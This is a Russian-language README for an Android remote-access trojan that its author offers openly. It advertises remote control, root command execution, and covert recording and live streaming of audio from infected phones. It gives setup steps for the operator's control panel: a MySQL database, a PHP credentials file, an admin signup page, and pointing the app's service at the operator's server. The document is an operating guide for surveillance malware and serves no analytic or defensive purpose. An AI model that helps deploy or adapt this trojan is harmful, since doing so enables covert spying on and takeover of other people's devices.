# -System-Android-RAT-Trojan 
![Php](https://img.shields.io/badge/php-7.1.3-blue "php 7.1.3")

Android Trojan (встроенный с Android SDK 21) исходный код

Android-троян с возможностью дистанционного управления, выполнения корневых команд, записи и онлайн-потоковой передачи звука

Это модификация трояна [android-trojan-service-](https://github.com/androidtrojan1/android-trojan-service- ) :)  
___
### Подготовка к работе

Для работы необходимо создать базу данных с названием **myratdevices** формата **utf8_general_ci**

После импортировать в неё файл **SQL FILE.sql**, должна выглядеть так
![Img 1](https://github.com/ldzombie/-System-Android-RAT-Trojan/blob/master/img/img_1.jpg?raw=true)

Структура devices
![Img 1](https://github.com/ldzombie/-System-Android-RAT-Trojan/blob/master/img/img_devices.jpg?raw=true)  

Users
![Img 1](https://github.com/ldzombie/-System-Android-RAT-Trojan/blob/master/img/img_users.jpg?raw=true)
___
В файле db.php нужно указать свою базу данных логин и пароль.

```php
<?php

require "libs/rb.php";
 R::setup( 'mysql:host=Хост;dbname=myratdevices',
        'Логин', 'Пароль' );
Error_Reporting(E_ALL & ~E_NOTICE & ~E_WARNING & ~E_STRICT);
session_start();
        ?>

```

### Первый запуск 

Когда создали базу данных и запустили хост, первым делом переходим на http://example.com/singup.php и создаем админа

![Img 1](https://github.com/ldzombie/-System-Android-RAT-Trojan/blob/master/img/singup.jpg?raw=true)

___

### Настройка в приложении

В файле app/MyService изменить адрес в переменной site

![Img 1](https://github.com/ldzombie/-System-Android-RAT-Trojan/blob/master/img/MyService.jpg?raw=true)


